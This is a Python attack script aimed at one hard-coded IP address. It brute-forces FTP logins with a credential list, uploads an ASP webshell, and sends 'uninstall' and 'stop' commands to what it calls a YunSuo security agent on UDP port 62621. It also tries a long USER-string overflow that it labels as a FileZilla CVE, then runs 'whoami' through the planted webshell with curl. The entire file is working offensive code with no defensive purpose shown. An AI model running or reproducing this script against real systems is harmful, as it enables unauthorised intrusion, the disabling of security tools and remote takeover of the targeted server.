import socket, ftplib, subprocess, sys, time

print("=" * 50)
print("SILVERPLUS FULL ATTACK")
print("=" * 50)

# 1. FTP ATTACK
print("\n[1] FTP Brute Force...")
users = ['anonymous','ftp','admin','administrator','silverplus']
passwords = ['','test@test.com','ftp','admin','admin123','123456','silverplus','silverplus123','100206']

for u in users:
    for p in passwords:
        try:
            f = ftplib.FTP()
            f.connect('113.113.81.253', 21, timeout=5)
            f.login(u, p)
            print('>>> FTP HIT: %s / %s <<<' % (u, p))
            try:
                files = f.nlst()
                print('Files:', files[:10])
                # Try to upload
                with open('/tmp/webshells/cmd.asp', 'rb') as fh:
                    f.storbinary('STOR cmd.asp', fh)
                print('Webshell uploaded!')
            except Exception as e:
                print('List/upload error:', str(e)[:80])
            f.quit()
            break
        except Exception as e:
            if '530' in str(e):
                pass  # wrong password
            else:
                pass  # connection error
    else:
        continue
    break

# 2. YunSuo 62621 ATTACK  
print("\n[2] YunSuo 62621 Attack...")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(4)
payloads = [
    b'uninstall', b'quit', b'stop', b'disable', b'exit',
    b'\x00\x01\x00\x00', b'\x01\x00\x00\x00',
    b'{"cmd":"uninstall"}', b'{"cmd":"stop"}',
    b'{"action":"uninstall","key":""}',
    b'remove', b'kill',
]
for pl in payloads:
    try:
        s.sendto(pl, ('113.113.81.253', 62621))
        data, addr = s.recvfrom(4096)
        print('Sent:', pl[:40], '-> Recv:', data[:100])
    except socket.timeout:
        pass
    except Exception as e:
        pass
s.close()

# 3. FTP known exploit: USER overflow (CVE-2010-4180)
print("\n[3] FileZilla CVE-2010-4180 overflow...")
try:
    s2 = socket.socket()
    s2.settimeout(5)
    s2.connect(('113.113.81.253', 21))
    s2.recv(1024)  # banner
    s2.send(b'USER ' + b'A' * 2048 + b'\r\n')
    resp = s2.recv(1024)
    print('USER overflow response:', resp[:50])
    s2.close()
except Exception as e:
    print('Overflow error:', str(e)[:60])

# 4. Check if cmd.asp was uploaded
print("\n[4] Check webshell...")
r = subprocess.run(['curl','-sk','--connect-timeout','4',
    'http://113.113.81.253/cmd.asp?cmd=whoami'],
    capture_output=True, text=True, timeout=6)
if 'nt authority' in r.stdout.lower() or 'administrator' in r.stdout.lower():
    print('>>> WEBSHELL ACTIVE!')
    print(r.stdout[:200])
elif r.stdout:
    print('Response:', len(r.stdout), 'bytes -', r.stdout[:100])

print("\nDone")
